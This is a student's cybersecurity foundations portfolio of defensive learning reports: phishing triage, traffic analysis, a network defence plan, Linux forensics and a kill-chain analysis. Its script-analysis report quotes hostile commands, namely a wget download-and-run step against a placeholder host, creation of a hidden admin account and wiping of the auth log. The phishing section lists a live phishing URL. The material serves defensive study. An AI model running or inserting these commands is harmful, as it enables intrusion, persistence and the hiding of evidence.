# CYBERSECURITY FOUNDATIONS PORTFOLIO

**Author:** Shikha  
**LinkedIn:** www.linkedin.com/in/shikha-5948b726b 
**Completed:** 21 October 2026

## PORTFOLIO OVERVIEW

This portfolio documents my ninety-day MyFirstHack cybersecurity foundation journey, from personal security and phishing analysis to networking, Linux investigation, digital forensics, attack analysis, network defence, vulnerability triage, and career development. The artifacts show how I am learning to examine available evidence, distinguish observations from assumptions, identify security gaps, consider risk and impact, and recommend practical defensive actions. Some reports use controlled practice evidence or simulated scenarios; they are presented as learning exercises rather than professional incident-response engagements.

## THE TEN ARTIFACTS

1. **Personal Security Audit (Day 3)**  
   Reviews personal account security and authentication practices in a privacy-conscious way, identifying possible improvements without exposing sensitive account details.

2. **Phishing Email Analysis (Day 15)**  
   Documents a phishing-analysis exercise using a suspicious URL and the sources described in the report. The report explains the limits of the available email evidence.

3. **Personal Threat Model (Day 20)**  
   Identifies important assets, possible adversaries, threat scenarios, and mitigations, demonstrating foundational risk-based thinking.

4. **Wireshark Traffic Investigation Report (Day 35)**  
   Documents analysis of a sample packet capture, including protocol observations, investigation filters, findings, and areas that would need further verification.

5. **Maya Network Defence Plan (Day 45)**  
   Assesses a simulated small-business network and prioritises segmentation, router security, guest Wi-Fi isolation, device updates, monitoring, and verification.

6. **Linux Investigation Report (Day 56)**  
   Uses static analysis to examine a suspicious Bash script that contains potentially harmful commands. The script was not executed.

7. **Linux Forensics Investigation (Day 65)**  
   Reviews staged evidence in a controlled WSL2 practice scenario, checking processes, network activity, logs, accounts, scheduled tasks, and files while stating the limits of the findings.

8. **Kill Chain Breach Analysis (Day 73)**  
   Analyses a simulated customer-data breach across the Cyber Kill Chain and identifies defensive intervention points. It is a learning scenario, not a real incident.

9. **Vulnerability Triage Report (Day 80)**  
   Prioritises seven hypothetical findings using context such as exposure, impact, exploitability, and patch availability rather than severity alone.

10. **Cybersecurity Foundations Portfolio (Day 90, this piece)**  
    Brings the nine earlier artifacts together with an overview, summaries, personal reflection, and contact information. It records the learning journey and provides a navigable starting point for reviewing the work.

## THE NINE ARTIFACTS, IN FULL

The nine reports below are embedded in chronological order. The individual Markdown source files can also be kept beside this master file in the portfolio folder, using clear, consistent filenames.


---

# 1. Personal Security Audit — Day 3

# 📄 Portfolio Artifact
**Portfolio Artifact #1**

## Personal Security Audit Report

> **Note:** This is a privacy-safe version of my personal security audit report. Personal information such as my email address, network details, and identifiable account information has been removed or generalized.

---

# 👤 Auditor Information

| Field | Details |
|-------|---------|
| **Auditor** | Shikha |
| **Audit Date** | 26 July 2026 |
| **Engagement** | Personal Digital Security Assessment |
| **Methodology** | Scope → Intelligence → Exposure → Severity → Remediation |

---

# 🎯 1. Scope

## Systems and Accounts Assessed

- **Primary Email:** `[REDACTED]`
- **Key Accounts:**
  - Google
  - Gmail
  - LinkedIn
  - Amazon
  - GitHub
- **Primary Devices:**
  - Windows Laptop
  - Android Phone
- **Network:** `[REDACTED]`

---

# 📋 2. Executive Summary

A personal security assessment was conducted to evaluate the security of my primary digital accounts and devices.

No known public data breaches or unrecognized active sessions were identified during the assessment. The audit highlighted several opportunities to strengthen account security, particularly by improving two-factor authentication (2FA) settings.

One security improvement was implemented immediately by enabling 2FA on my LinkedIn account.

---

# 🔍 3. Findings

## 🔴 Critical

- Primary Google account does not currently use app-based two-factor authentication.

---

## 🟠 High

- LinkedIn account did not have two-factor authentication enabled at the time of assessment (**remediated during this audit**).
- Approximately **six important accounts** could potentially be reset if an attacker gained access to my primary email account, highlighting the importance of protecting the primary email account.

---

## 🟡 Medium

- OSINT analysis revealed that my email address is associated with **multiple online services**, demonstrating my publicly visible digital footprint.
- Amazon currently uses **SMS-based two-factor authentication**, which provides weaker protection than an authenticator application.

---

## 🟢 Low

- No known public data breaches were found for my primary email address.
- No unrecognized active sessions were detected. Only my recognized Windows laptop and Android phone were signed in.

---

# ✅ 4. Actions Taken During Audit

- ✅ Enabled Two-Factor Authentication (2FA) on my LinkedIn account.

---

# 🛠️ 5. Remediation Plan

## 📅 This Week

- Upgrade my Google account to app-based two-factor authentication.
- Replace SMS-based 2FA on Amazon with an authenticator app (if supported).
- Review password recovery options for my important accounts.

---

## 📆 This Month

- Review accounts associated with my primary email and remove unused accounts where appropriate.
- Review passwords and ensure each important account has a strong, unique password.
- Repeat this personal security audit to measure security improvements.

---

# 🏁 Conclusion

This audit provided practical experience in applying a structured cybersecurity audit methodology.

Rather than only studying security concepts, I assessed my own digital environment, identified potential risks, prioritized findings based on severity, and implemented an immediate remediation.

The exercise reinforced the importance of protecting a primary email account, understanding digital exposure through OSINT, and following a systematic approach to improving personal security.


---

# 2. Phishing Email Analysis — Day 15

# 📑 SOC-Style Phishing Analysis Report
**Portfolio Artifact #2**

## 📋 Basic Information

| Field | Details |
|-------|---------|
| **Analyst** | Shikha |
| **Analysis Date** | August 7, 2026 |
| **Engagement** | Suspected Phishing URL Investigation |
| **Methodology** | PhishTank → WHOIS → VirusTotal → URLScan.io → Social Engineering Analysis → Final Report |

---

## 1️⃣ Incident Summary

Since I could not find a suitable phishing email in my spam folder, I used a **verified phishing URL from PhishTank** for this investigation.

The investigation focused on analysing the phishing URL, domain registration details, threat intelligence results, and the social engineering techniques used by the attacker.

Although the phishing page was no longer accessible during the investigation, historical threat intelligence confirmed it had previously been identified as a phishing campaign.

---

## 2️⃣ Indicators of Compromise (IOCs)

| Indicator | Observation |
|-----------|-------------|
| **Phishing URL** | `https://dupplacidadania.com/wp-admin/js/widgets/membercenter.made-in-china.com/index.html` |
| **Hosting Network** | Oracle Corporation (AS31898) |
| **Domain** | dupplacidadania.com |
| **Registrar** | PublicDomainRegistry (PDR Ltd.) |
| **Creation Date** | March 30, 2023 |
| **Status During Analysis** | Offline (DNS Resolution Error) |

---

## 3️⃣ Email Header Analysis

Since this investigation was performed using **PhishTank (Option C)** instead of a real phishing email, email header analysis could not be completed.

| Field | Result |
|-------|--------|
| SPF | Not Available |
| DKIM | Not Available |
| DMARC | Not Available |
| Sender Address | Not Available |
| Received Headers | Not Available |

**Reason:** The original phishing email was not available, so email authentication results could not be analysed.

---

## 4️⃣ Domain Investigation

| Item | Observation |
|------|-------------|
| Domain | dupplacidadania.com |
| Registrar | PublicDomainRegistry |
| Hosting Provider | Oracle Corporation |
| DNSSEC | Unsigned |
| Domain Age | Created in March 2023 |

### Findings

- WHOIS successfully revealed the domain registration information.
- The phishing URL used a long and confusing path.
- The actual domain differed from what many users might assume.
- A legitimate registrar does **not** guarantee a legitimate website.

---

## 5️⃣ URL Analysis

### 🔹 VirusTotal

**Result**

- No security vendors flagged the URL as malicious.

**Observation**

Even though VirusTotal reported no detections, the URL had already been verified as phishing by PhishTank.

**Learning**

Different threat intelligence platforms collect and update data independently. Analysts should compare results from multiple trusted tools before making a final decision.

---

### 🔹 URLScan.io

**Result**

HTTP 400 Error
DNS Error – Could not resolve domain


**Observation**

The phishing website was no longer accessible.

**Learning**

Phishing websites are often removed or become inactive shortly after being reported. Historical threat intelligence is still valuable even after a phishing page disappears.

---

## 6️⃣ Social Engineering Analysis

### Techniques Identified

- ✅ Familiarity
- ✅ Authority (Possible)
- ✅ Urgency (Possible)

### Explanation

The phishing URL attempted to appear trustworthy and encourage users to interact with it without carefully checking the destination.

The attack relied more on manipulating user trust than exploiting technical vulnerabilities.

### Likely Target

- General internet users
- Non-technical users
- Users unfamiliar with identifying suspicious URLs

---

## 7️⃣ Severity Assessment

**Severity:** 🟠 Medium

### Justification

The phishing URL had already been confirmed by PhishTank, indicating that it was part of a real phishing campaign.

Although the page was offline during analysis, the URL structure and threat intelligence suggested it had been designed to deceive users into visiting a malicious website.

---

## 8️⃣ Recommended Actions

### For Individual Users

- Never click suspicious links directly.
- Verify the actual domain before entering credentials.
- Enable Multi-Factor Authentication (MFA).
- Report phishing attempts instead of interacting with them.

### For Organisations

- Block known phishing domains.
- Use multiple threat intelligence sources during investigations.
- Conduct regular phishing awareness training.
- Monitor newly reported phishing campaigns.

---

## 🎯 Final Verdict

| Field | Result |
|------|--------|
| **Classification** | Phishing |
| **Confidence** | High |
| **Severity** | Medium |

### Conclusion

This investigation demonstrated that phishing analysis involves much more than checking whether a URL is online.

One of the biggest lessons I learned was that **security analysts should never rely on a single security tool**. VirusTotal, PhishTank, WHOIS, and URLScan.io each contributed different evidence, and combining these findings resulted in a more accurate assessment.

This project also reinforced that successful phishing attacks rely heavily on **social engineering**, making user


---

# 3. Personal Threat Model — Day 20

# PERSONAL THREAT MODEL
**Portfolio Artifact #3**

**Model Date:** August 12, 2026  
**Engagement:** Personal Threat Modelling Exercise  
**Methodology:** Assets → Adversaries → Attack Scenarios → Mitigations

---

## 1. WHO ARE YOU?

**Role/Occupation:** MCA Student  
**Public profile:** Professional profiles, portfolio, public projects, and social-media presence  
**Notable factors:** Maintains academic documents, cybersecurity learning notes, coding projects, online accounts, and professional profiles.

---

## 2. WHAT ARE YOU PROTECTING?

### CROWN JEWELS — Critical Assets

- Primary email and accounts that provide recovery access to other accounts.
- Financial accounts and payment services.
- Personal and academic documents.
- Important personal data and files.

### HIGH-VALUE — Important Assets

- Professional profiles and reputation.
- Development and portfolio accounts.
- Cloud accounts and stored documents.
- Laptop and smartphone.

### LOWER-VALUE — Replaceable Assets

- Other social-media accounts.
- Online shopping accounts.
- Other accounts and data that would be inconvenient but generally possible to recover or replace.

---

## 3. WHO MIGHT WANT TO HARM YOU?

### OPPORTUNISTIC ATTACKERS

- [x] Phishing campaigns targeting online accounts.
- [x] Credential stuffing using previously exposed or reused passwords.
- [x] Malicious links and fraudulent messages.
- [x] Malicious applications disguised as educational resources or cybersecurity tools.

### TARGETED CRIMINALS

- [ ] Targeted phishing based on education, career interests, or public information.
- [ ] Account takeover for financial gain.
- [ ] Identity theft or reputational damage using public information.

### PERSONAL ADVERSARY

- [ ] 

### LARGER ACTORS

- [ ] State-sponsored attacks.
- [ ] Corporate espionage or other highly targeted operations.

**Assessment note:** Opportunistic attacks were identified as realistic threats. More targeted or highly sophisticated attacks should be assessed according to the individual's circumstances rather than assumed.

---

## 4. WHAT CAN THEY DO?

### THREAT 1: Social Engineering and Phishing

**Likelihood:** Medium  
**Impact:** Medium  
**Vector:** A convincing message based on personal interests, education, career goals, or publicly available information. The message may direct the recipient to a malicious link or fraudulent request.

### THREAT 2: Fake Financial Alert

**Likelihood:** High  
**Impact:** High  
**Vector:** A fraudulent transaction alert designed to create urgency and persuade the recipient to click a malicious link, contact fake support, or provide sensitive information.

### THREAT 3: Malicious Application

**Likelihood:** Medium  
**Impact:** Medium  
**Vector:** An application presented as a study tool, cybersecurity application, training resource, or professional opportunity, but distributed through an untrusted source.

---

## 5. WHAT WILL YOU DO ABOUT IT?

### ALREADY IN PLACE

- [ ] Strong passwords and a password manager.
- [ ] Multi-factor authentication on important accounts.
- [ ] Login alerts and secure account-recovery methods.
- [ ] Device PIN or biometric protection.

### TO DO THIS WEEK

- [ ] Verify the security settings of important accounts.
- [ ] Review account-recovery methods and authorised connected applications.
- [ ] Check whether multi-factor authentication is enabled on critical accounts.
- [ ] Verify unexpected financial alerts through official applications or trusted channels.

### TO DO THIS MONTH

- [ ] Review account permissions and connected applications.
- [ ] Ensure important accounts use unique passwords.
- [ ] Review login alerts and available account-security features.
- [ ] Continue reviewing security gaps and prioritising improvements.

### ACCEPTING THE RISK ON

- [ ] Public LinkedIn — necessary for career visibility

---

## 6. WHAT YOU ARE NOT TRYING TO DEFEND AGAINST

The threat model focuses on realistic personal cybersecurity risks, including opportunistic phishing, social engineering, account compromise, fraudulent financial alerts, and malicious applications.

**Threats explicitly excluded from the assessment:** 

---

**END OF MODEL**


---

# 4. Wireshark Traffic Investigation Report — Day 35

# Traffic Investigation Report
**Portfolio Artifact #4**

**Analyst:**  Shikha
**Analysis Date:**  27 August 2026
**Engagement:** Network Traffic Capture Investigation  
**Methodology:** Orient → Question → Filter → Follow → Compare → Document

---

## 1. Capture Summary

- **Source:** Wireshark sample capture `http_with_jpegs.cap`
- **Total packets:** 483
- **Time span:** 11 seconds (2004-11-20 03:59:14 to 03:59:25)

**Headline:** The capture contained HTTP web traffic, including HTML page requests and JPEG image transfers. The investigation found no clear evidence of the attack patterns checked, although unencrypted HTTP traffic was present.

## 2. Orientation

### Top protocols (from Protocol Hierarchy)

- IPv4 — 483 packets
- TCP — 464 packets
- HTTP — 39 packets

### Busiest conversation (from Conversations, sorted by bytes)

- **Conversation:** `10.1.1.101:3200 ↔ 10.1.1.1:80`
- **Packets:** 209
- **Data:** Approximately 204 KB
- **TCP Stream ID:** 18

### Notable endpoints

- `10.1.1.101`
- `10.1.1.1`
- No endpoint stood out as clearly anomalous based on the endpoint information examined.

## 3. Investigation

**Question investigated:** What is the main high-volume HTTP conversation, and does the traffic represent normal web activity or a suspicious network pattern?

### Filters used

```wireshark
http
http.response
tcp.stream eq 18
tcp.flags.reset == 1
dns
```

### Findings from following the thread

Following TCP Stream 18 revealed an HTTP GET request for a JPEG image. The server returned `HTTP/1.1 200 OK`, with `Content-Type: image/jpeg` and `Content-Length: 191515`. This explained the high volume of traffic in the busiest conversation. Other HTTP requests for HTML pages and images were also observed.

## 4. Comparison to Baseline

The traffic was assessed against normal-traffic patterns and the attack patterns checked during this investigation.

| Pattern / Indicator | Assessment | Evidence |
|---|---|---|
| Normal traffic | Observed | Following TCP Stream 18 revealed an HTTP request for a JPEG image and a successful `200 OK` response. The high-volume conversation was explained by the image transfer. |
| Port scan signature | Not observed by the check performed | The filter `tcp.flags.reset == 1` returned no packets, so the investigation did not find evidence of the classic port-scan pattern checked. This filter alone cannot rule out all port scans. |
| Suspicious DNS | Not observed in this capture | The filter `dns` returned no packets. No DNS traffic was available in this capture to support a suspicious-DNS finding. |
| Beacon pattern | Not observed | The IO Graph did not show a clear, regular beacon-like pattern of small connections at consistent intervals. |
| Plaintext exposure | Present | HTTP traffic was present instead of HTTPS, making the application-layer requests and responses readable in Wireshark. |
| Other / unexplained | No clear finding from the checks performed | The evidence examined did not reveal another clearly unexplained pattern. |

## 5. Verdict and Confidence

- **Verdict:** Normal traffic
- **Confidence:** PROBABLE

**Reasoning:** The evidence examined was consistent with ordinary HTTP web browsing and image retrieval. The busiest conversation was explained by a JPEG image transfer, and the specific checks performed did not reveal clear port-scanning, suspicious-DNS, or beaconing patterns.

Confidence is **PROBABLE** rather than **CERTAIN** because the capture contained multiple instances of `TCP Previous segment not captured`, indicating that some TCP segments may be missing. The conclusion is therefore limited to the traffic available for analysis. The absence of a pattern in this capture does not prove that no malicious activity occurred.

## 6. Recommended Next Steps

If this were a real engagement:

1. Investigate the external address `209.225.0.6` to determine whether the communication was expected and identify the service or application responsible.
2. Capture additional traffic from the same host if further evidence is required.
3. Check the external IP against reputable threat-intelligence sources and validate any matches with additional context.

---

**End of Report**


---

# 5. Maya Network Defence Plan — Day 45

# Network Defense Plan

**Prepared by:**  Shikha
**Date:**  6 September 2026
**Client:** Maya's Clothing Shop (small retail business)  
**Engagement:** Network Security Assessment and Remediation Plan

---

## 1. Assessment Summary

Maya's Clothing Shop has a flat network where payment systems, business devices, IoT devices, and customer Wi-Fi share the same network. The main risks include the lack of network segmentation, default router administrator credentials, an old Wi-Fi password publicly displayed on a chalkboard, outdated security cameras, and no established monitoring or log-review process.

The most urgent priorities are to separate customer Wi-Fi from payment systems, implement network segmentation, and change the router's default administrator credentials.

## 2. Network Inventory

| Device / System | Category | Holds / Does |
|---|---|---|
| Payment tills (2) | Payment | Processes card payments |
| Security cameras (4) | IoT | Provides security monitoring; cameras have never been updated |
| Back-office laptop | Data | Stores business records and customer information |
| Maya's laptop | Personal | Used for business and personal browsing |
| Staff phones (2) | Staff | Communication and network access |
| Smart speaker | IoT | Smart assistant |
| Network printer | Infrastructure | Business printing |
| Customer Wi-Fi | Guest | Provides customer internet access; shares the main network |
| ISP-provided router | Infrastructure | Provides internet and network connectivity; default administrator credentials remain in use |

## 3. Prioritised Risks

### Critical

- **Flat network:** All devices share one network, reducing barriers that could prevent a compromised device from reaching other systems and enabling potential lateral movement.
- **Customer Wi-Fi shares the payment network:** Untrusted customer devices have network access within the same environment as payment systems, increasing exposure and creating payment-security and compliance concerns.
- **Default router administrator credentials:** The router's default credentials have not been changed, potentially allowing unauthorised management access and changes to network settings.

### High

- **Old and exposed Wi-Fi password:** The Wi-Fi password has remained unchanged for three years and is written on a chalkboard, increasing the risk of unauthorised access.
- **No monitoring or log review:** Suspicious activity could go unnoticed, and limited logging could make an incident more difficult to investigate.

### Medium

- **Outdated security cameras:** The four cameras have never been updated, leaving potential vulnerabilities unresolved and increasing the IoT attack surface.
- **Back-office laptop containing customer data:** Staff sometimes use the laptop, increasing the risk of data exposure or compromise.
- **Maya's dual-use laptop:** Business and personal browsing on the same device may increase exposure to security risks.
- **Staff devices and network printer:** These devices add to the network's attack surface and require appropriate access restrictions and security controls.

### Low

- **Smart speaker:** The device presents an additional IoT and privacy risk, although its immediate business impact was assessed as comparatively limited.

## 4. Recommended Fixes

- **Segment the network:** Separate payment systems, business devices, staff devices, IoT devices, and customer Wi-Fi into distinct security zones. Restrict communication between zones to what is necessary.
- **Secure the router:** Change the default administrator credentials to a strong, unique password, update router firmware, disable remote administration unless required, and check and configure the firewall.
- **Improve Wi-Fi security:** Use WPA3 where supported, or strong WPA2 where WPA3 is unavailable. Set a strong, unique Wi-Fi password and remove it from the public chalkboard.
- **Isolate customer Wi-Fi:** Allow customer devices to access the internet without reaching payment systems, business devices, or router management.
- **Secure devices:** Update supported cameras and replace unsupported devices. Keep laptops patched, isolate IoT devices where possible, secure the printer, and restrict access to sensitive business information.
- **Introduce monitoring:** Enable useful logging, monitor important security events, establish a regular log-review process, and investigate suspicious activity.
- **Improve recovery readiness:** Maintain backups of important business information and establish a basic incident-response process.

## 5. Phased Action Plan

### Do First — Critical, Highest Leverage

- Implement network segmentation.
- Separate customer Wi-Fi from payment and business networks.
- Isolate payment systems from unnecessary devices.
- Change the router's default administrator credentials.
- Check and configure the router firewall.
- Change the business Wi-Fi password and remove it from the chalkboard.

### This Week

- Update or replace outdated security cameras.
- Isolate IoT devices where possible.
- Secure the back-office laptop and restrict access to customer information.
- Review staff-device access.
- Configure basic monitoring and logging.
- Secure the network printer.

### This Month

- Review accounts and access permissions.
- Remove unnecessary devices and accounts.
- Test network segmentation and firewall rules.
- Establish an incident-response process.
- Schedule regular security reviews.

## 6. How Maya Will Know It Worked

- Customer devices can access the internet but cannot reach payment systems, business devices, or router management; IoT devices are also restricted from accessing payment systems.
- The router no longer uses default administrator credentials, firewall protection is configured, business Wi-Fi uses appropriate security, and outdated cameras have been updated or replaced.
- Important security events are logged, logs are reviewed regularly, sensitive business information has appropriate access restrictions, and the network controls are tested to confirm they work.

---

**End of Plan**


---

# 6. Linux Investigation Report — Day 56

# Suspicious File Analysis
**Portfolio Artifact #6**

**Analyst:** Shikha  
**Analysis Date:** 16 September 2026  
**File Examined:** `suspicious.sh`  
**Method:** Static examination only (file was never executed)

---

## 1. Summary

The file is a Bourne-Again shell (Bash) script containing commands that would download and execute a payload, create a user account, and overwrite the authentication log if executed.

**Verdict:** Malicious  
**Confidence:** High

---

## 2. File Identification

- **Reported type (`file` command):** Bourne-Again shell script, ASCII text executable
- **Name vs. actual type:** The name `suspicious.sh` matches the identified shell-script type.

---

## 3. File Properties (`ls -l`)

- **Permissions:** `-rw-r--r--`
- **Executable?:** No. There is no `x` permission in the permission string, so the file does not have execute permission.
- **Owner:** `shikha`
- **Size:** 145 bytes
- **Modified:** Sep 16, 12:18

---

## 4. Contents and Red Flags

The file was examined by reading it with `cat` or `less`; it was never run.

### Red flags found

- [x] **Downloads a file from a remote web address:**  
  `wget http://example-bad-site.test/payload.sh`  
  This follows a fetch-a-payload pattern.

- [x] **Runs the downloaded file:**  
  `bash payload.sh`  
  This is a download-and-execute pattern and runs potentially untrusted code.

- [x] **Creates a user account:**  
  `useradd hidden_admin`  
  This could enable persistence or unauthorized access.

- [x] **Overwrites the authentication log:**  
  `echo "" > /var/log/auth.log`  
  This may indicate an attempt to cover tracks.

---

## 5. Verdict and Confidence

**Verdict:** MALICIOUS  
**Confidence:** HIGH

### Evidence-based reasoning

The verdict is based on specific behaviours found in the script. The `wget` command attempts to download a payload from a remote web address, followed by `bash payload.sh`, which attempts to execute the downloaded script. The `useradd hidden_admin` command attempts to create a new user account, which could provide persistence or unauthorized access. Finally, `echo "" > /var/log/auth.log` appears intended to overwrite authentication logs, which can be associated with covering tracks.

Together, these behaviours form a clear pattern of potentially malicious activity.

---

## 6. Recommendations

- [x] **Do NOT execute the file.**
- [x] **Preserve the file as evidence** for further analysis. If appropriate, remove execute permission while keeping the file rather than deleting it.
- [x] **Escalate the finding** to the appropriate incident-response or security team.
- [x] **Check the system for signs of related activity**, such as an unexpected `hidden_admin` account, evidence of the downloaded payload, or changes to authentication logs.

---

**End of Analysis**


---

# 7. Linux Forensics Investigation — Day 65

# Linux Forensics Investigation

**Portfolio Artifact #7**

**Investigator:** Shikha  
**Date:** 26 September 2026  
**System Examined:** WSL2 Linux practice environment  
**Scenario:** Suspected compromise (staged practice scenario)  
**Method:** Live and historical examination; suspicious files examined without execution

---

## 1. Summary

- Controlled Linux forensics exercise using harmless, investigator-created evidence.
- Reviewed processes, network connections, authentication logs, accounts, scheduled tasks, and recently modified files.
- No obvious evidence of a real compromise was identified in the evidence examined.
- The staged `/tmp/update.sh` file was plain ASCII text, non-executable, and contained harmless placeholder content. It was examined but never executed.
- **Confidence:** MEDIUM, because this was a staged scenario and the investigation covered selected evidence rather than a full forensic acquisition.

---

## 2. Investigator's Checklist Findings

### Processes — What's running that shouldn't be?

- Reviewed running processes with `ps aux`.
- Observed normal-looking Linux/WSL system processes, service accounts, and user shell processes.
- No obviously abnormal CPU or memory usage was identified.
- Some command names were truncated in the terminal output, so unfamiliar processes would require further investigation in a real incident.
- **Look for:** unusual names or paths, high resource usage, unexpected privileges, and suspicious parent/child processes.

### Network Connections — What it's talking to

- Reviewed network state with `ss -tuln` and `ss -tunap`.
- Port 53 listeners were observed for DNS-related activity.
- Port 323 was observed on local addresses for time-synchronisation activity.
- No obviously suspicious established external connection was identified in the captured output.
- Process mapping was not available in the captured socket output, so no process was attributed to a socket without evidence.
- **Look for:** unexpected listeners, unknown remote destinations, unusual outbound connections, and process-to-network links.

### Logs — History and timeline

- Reviewed the available tail of `/var/log/auth.log`.
- Observed normal user session activity for the investigator account.
- Observed a root CRON session opening and closing.
- Observed a sudo session used during the investigation.
- No failed-login-then-success pattern was visible in the captured log section.
- **Look for:** failed logins, unusual successful logins, account creation, privilege changes, and suspicious sudo activity.

### Accounts — Who exists and who can use sudo?

- Reviewed `/etc/passwd` for system and user accounts.
- The expected investigator account was present with a normal home directory and Bash shell.
- Reviewed sudo membership with `getent group sudo`.
- No unexplained rogue account was identified.
- **Look for:** unexpected accounts, unusual UIDs, interactive shells on service accounts, and unexpected sudo membership.

### Scheduled Tasks — Persistence

- Reviewed the user's cron configuration with `crontab -l`.
- No user-level cron job was present.
- Reviewed `/etc/cron.d`; `e2scrub_all` was present.
- The system cron entry was not treated as malicious based only on its filename.
- `evidence_note.txt` was only a training marker and was not an actual cron persistence mechanism.
- **Look for:** unexplained commands, unusual script locations, writable scripts run with elevated privileges, and tasks that could relaunch unwanted activity.

### Files — Suspicious files

- Investigated `/tmp/update.sh` without executing it.
- **File type:** ASCII text.
- **Size:** 38 bytes.
- **Permissions:** `-rw-r--r--`.
- **Owner/group:** Investigator account.
- **Modified:** 26 September 2026 at 11:16 UTC.
- Contents were harmless placeholder text created for the exercise.
- Recently modified file searches also identified the two harmless staged marker files and normal system/application files.
- Recent modification was treated as an investigation lead, not automatic proof of malicious activity.

---

## 3. Timeline of Events

- **26 Sep, 11:14:45 UTC** — Investigator's Linux user session opened.
- **26 Sep, 11:16 UTC** — Harmless staged `/tmp/update.sh` was created or modified for the investigation.
- **26 Sep, 11:17:01 UTC** — A root CRON session opened and closed.
- **Investigation phase** — Running processes were reviewed for unusual or unexpected activity.
- **Investigation phase** — Listening sockets and current network state were examined.
- **Investigation phase** — Authentication logs were reviewed for login, sudo, and CRON activity.
- **Investigation phase** — Accounts and sudo membership were reviewed.
- **Investigation phase** — User and system cron configuration was reviewed for persistence.
- **Investigation phase** — Recently modified files were searched, and `/tmp/update.sh` was examined safely.
- **26 Sep, 12:08:15 UTC** — Investigator used sudo to review the authentication log.
- **After investigation** — Staged evidence was removed as part of cleanup.

**Note:** This timeline represents a controlled training scenario. The staged files were created by the investigator and do not represent a real intrusion.

---

## 4. Verdict and Confidence

**Verdict:** NOT COMPROMISED (within the evidence examined)  
**Confidence:** MEDIUM

### Evidence-based reasoning

- No obviously malicious process was identified.
- No obviously suspicious established external connection was identified.
- The examined authentication-log section showed no obvious failed-login-then-success pattern.
- No unexplained account or suspicious user cron job was found.
- `/tmp/update.sh` was intentionally staged, contained harmless placeholder content, and was never executed.
- The investigation was limited to selected live state, logs, configuration, and recent-file evidence.
- A real incident would require broader historical analysis and potentially disk or memory acquisition.
- The verdict does not prove that the system has never been compromised; it reflects only the evidence examined.

---

## 5. How the Attacker Got In and Stayed

### Entry

- No real attacker entry was established because this was a staged practice scenario.
- In a real incident, correlate authentication logs, network activity, exposed services, vulnerabilities, and account activity to identify the entry point.

### Actions

- No real attacker actions were observed.
- The harmless staged `/tmp/update.sh` represented a suspicious-file finding for investigation.
- The file was examined without execution.

### Persistence

- No actual persistence mechanism was identified.
- The user's cron was empty.
- `/etc/cron.d` contained `e2scrub_all`, which was not treated as malicious without further evidence.
- `evidence_note.txt` was only a training marker, not an actual cron persistence mechanism.

---

## 6. Recommendations

- [x] Remove the staged evidence after completing the investigation.
- [ ] Preserve relevant evidence before making changes in a real incident.
- [ ] Review authentication, system, kernel, and application logs over a wider historical period.
- [ ] Investigate unexpected processes and correlate them with executable paths, users, timestamps, and network connections.
- [ ] Find and review all persistence mechanisms, including cron, systemd services, SSH keys, and startup configuration.
- [ ] Remove rogue accounts and reset compromised credentials if evidence supports compromise.
- [ ] Apply Linux hardening: updates, least privilege, reduced unnecessary services, secure remote access, and monitoring.
- [ ] Escalate according to the incident-response process if stronger evidence of compromise is discovered.

---

## 7. Scope and Limitations

- Controlled learning exercise using harmless, investigator-created evidence.
- No real malware was introduced or executed.
- The suspicious file was examined safely without execution.
- The investigation covered processes, network connections, logs, accounts, scheduled tasks, and files.
- The exercise demonstrated how individual findings can be connected into a timeline and evaluated as evidence.
- A real investigation would add broader historical log analysis, process-to-network correlation, persistence checks beyond cron, file integrity analysis, and potentially memory or disk imaging.
- Because this was staged, the findings demonstrate investigative method rather than evidence of a real attack.

---

**End of Investigation**


---

# 8. Kill Chain Breach Analysis — Day 73

# Kill Chain Breach Analysis
**Portfolio Artifact #8**

**Analyst:** Shikha  
**Date:** 4 October 2026  
**Subject:** Simulated Customer Data Breach  
**Source:** MyFirstHack Day 73 lesson scenario (simulated/composite scenario)

---

## 1. Breach Summary

A mid-sized company was targeted by an attacker who researched the organisation and its employees before sending a convincing supplier-themed phishing email to finance staff. The attacker exploited outdated software, established persistence, maintained command and control, moved through the network, and accessed the customer database.

The attacker's goal was to steal customer data, and the objective was achieved when the customer database was copied to the attacker-controlled server. The breach was discovered later when the stolen data appeared for sale.

---

## 2. Kill Chain Mapping

### Reconnaissance
The attacker researched the company's website, employees, professional networks, email address format, and finance department names.

### Weaponization
The attacker created a convincing phishing email impersonating a known supplier and prepared a malicious attachment disguised as an invoice.

### Delivery
The phishing email containing the malicious attachment was sent to several finance employees.

### Exploitation
One employee opened the attachment. The attacker exploited an outdated software vulnerability, allowing code execution and providing an initial foothold.

### Installation
The attacker installed a backdoor and created a hidden scheduled task to maintain access after the system restarted.

### Command and Control
The compromised machine quietly connected to an attacker-controlled server, allowing the attacker to issue remote commands and continue operating.

### Actions on Objectives
The attacker explored the network, stole credentials, moved to other systems, reached the customer database, and copied the database to the attacker's server. The objective of stealing customer data was achieved.

---

## 3. Techniques Used (ATT&CK Thinking)

- **Stage: Delivery**  
  **Technique:** Phishing email with a malicious attachment disguised as an invoice  
  **Tactic:** Initial Access

- **Stage: Installation**  
  **Technique:** Hidden scheduled task used to maintain access  
  **Tactic:** Persistence

- **Stage: Command and Control**  
  **Technique:** Outbound connection or beaconing to an attacker-controlled server  
  **Tactic:** Command and Control

- **Stage: Exploitation**  
  **Technique:** Exploitation of an outdated software vulnerability  
  **Tactic:** Initial Access / Execution

---

## 4. Where the Chain Could Have Broken

- **Stage: Delivery**  
  **Defence:** Email filtering, malicious-attachment analysis, and phishing awareness/reporting could have prevented the attachment from being opened.

- **Stage: Exploitation**  
  **Defence:** Patching the outdated software could have prevented the vulnerability from being exploited.

- **Stage: Installation**  
  **Defence:** Monitoring for unexpected scheduled tasks and other persistence mechanisms could have exposed the attacker's persistence.

- **Stage: Command and Control**  
  **Defence:** Monitoring for unusual outbound connections and beaconing could have detected communication with the attacker's server.

- **Stage: Actions on Objectives**  
  **Defence:** Monitoring sensitive database access and large or unusual outbound data transfers could have detected the theft.

### Most Effective Defence

Patching the outdated software would have been the most effective defence in this scenario. The attacker needed the vulnerability to turn the opened attachment into code execution and gain an initial foothold. If the software had been patched, the exploit described in the scenario could have failed, preventing the later stages of the attack.

---

## 5. Lessons That Generalise

This analysis shows that successful attacks are usually a sequence of connected activities rather than a single event. Organisations therefore need multiple layers of defence.

Important defensive lessons include:

- Reduce unnecessary public information that can support targeted social engineering.
- Use email filtering and attachment analysis to detect malicious messages.
- Keep software patched to reduce exploitable vulnerabilities.
- Monitor for unexpected persistence mechanisms such as scheduled tasks.
- Monitor outbound network traffic for unusual connections and beaconing.
- Monitor credential use and lateral movement between systems.
